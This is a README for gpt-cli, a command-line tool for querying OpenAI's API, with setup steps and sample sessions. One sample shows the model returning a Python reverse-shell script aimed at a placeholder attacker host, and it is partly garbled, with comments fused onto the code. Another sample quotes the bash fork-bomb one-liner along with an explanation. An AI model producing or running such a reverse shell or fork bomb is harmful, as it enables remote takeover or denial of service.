# gpt-cli

This is a command line tool used for interacting with OpenAI's API.

Default model is `gpt-3.5-turbo` (but you can change it to whatever you want).

This tool requires the following environment variables to be set:

- `OPENAI_API_KEY`

You can further tweak functionality by setting the following additional environment variables:

- `OPENAI_MODEL`
- `OPENAI_DEFAULT_PROMPT`
- `OPENAI_LOGFILE`
- `OPENAI_TEMPERATURE`
- `OPENAI_MAX_TOKENS`

All environment variables can be set by filling in values from `example.env`, renaming that file to `.env`, and running `./bin/gpt3 'Your prompt here'`.

There is also a `gpt4` command in case you set your model to GPT-4 and feel stupid running the `gpt3` command.

Alternately, you can pass the environment variables  on the command line using something like this:

```
OPENAI_API_KEY=foo ./bin/gpt3 'Your prompt here'
```

If installing from PyPi, set the `OPENAI_API_KEY` in your `~/.bashrc` or `~/.zshrc`, and run as follows:

```
gpt3 'Your prompt here'
```

## Installation (PyPi) - set variables in rc files:

`python3 -m pip install gpt-cli`

## Installation (local) - set variables in .env:

```
git clone https://github.com/phx/gpt-cli
cd gpt-cli
python3 -m pip install -r requirements.txt
```

### Examples:

If given the `-p` or `--print` option, it will display the full prompt and response.


```
╭─phx@bigboi ~/git/gpt-cli  ‹master*› 
╰─➤  gpt3 --print 'Write python script to create reverse shell.'
----------------------------------------------------------------------
Prompt:
Write python script to create reverse shell.

Answer:
import socket
import subprocess# Create a socket
s = socket.socket()# Connect to the attacker machine
s.connect(("attacker_ip", attacker_port))# Create a subprocess to execute a shell
proc = subprocess.Popen(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno())# Keep the connection alive
while True:
    data = s.recv(1024)
    if data == "exit":
        break
    proc.stdin.write(data)
    proc.stdout.flush()# Close the connection
s.close()
----------------------------------------------------------------------
```

```
╭─phx@bigboi ~/git/gpt-cli  ‹master*› 
╰─➤  OPENAI_DEFAULT_PROMPT='Do not give nonsense answers. If you do not know that your answer is factual, respond with "Unknown. "' gpt3 -p 'Who is Gregory Washingheimer Van Fleet?'
----------------------------------------------------------------------
Prompt:
Who is Gregory Washingheimer Van Fleet?

Answer:
Unknown.
----------------------------------------------------------------------
╭─phx@bigboi ~/git/gpt-cli  ‹master*› 
╰─➤  OPENAI_DEFAULT_PROMPT='Do not give nonsense answers. If you do not know that your answer is factual, respond with "Unknown. "' gpt3 --print 'Who is John Adams?'                     
----------------------------------------------------------------------
Prompt:
Who is John Adams?

Answer:
John Adams was the second President of the United States, serving from 1797 to 1801.
----------------------------------------------------------------------
```

When taking redirected or piped input from STDIN, it will only output the answer.

```
╭─phx@birdbox ~/git/gpt-cli ‹master●›
╰─$ echo 'Tell me what this code does: :(){ :|:& };:' | bin/gpt3

This code is a fork bomb, a type of denial-of-service attack that continuously replicates itself to consume system resources and eventually cause the system to become unresponsive.

Here's a breakdown of what the code does:

1. `:(){ ... };:` - This defines a function named `:` that contains the code within the curly braces `{}` and then calls the function `:`.

2. `:|:` - This is the recursive part of the fork bomb. It pipes the output of the function `:` back into the function itself, causing it to continuously replicate.

3. `&` - This runs the function in the background, allowing it to continue replicating without blocking the terminal.

When this code is executed, it will rapidly spawn new instances of the function `:` until the system's resources are exhausted, leading to a system crash or unresponsiveness. It is important to never run this code on a system as it can cause serious damage.
```

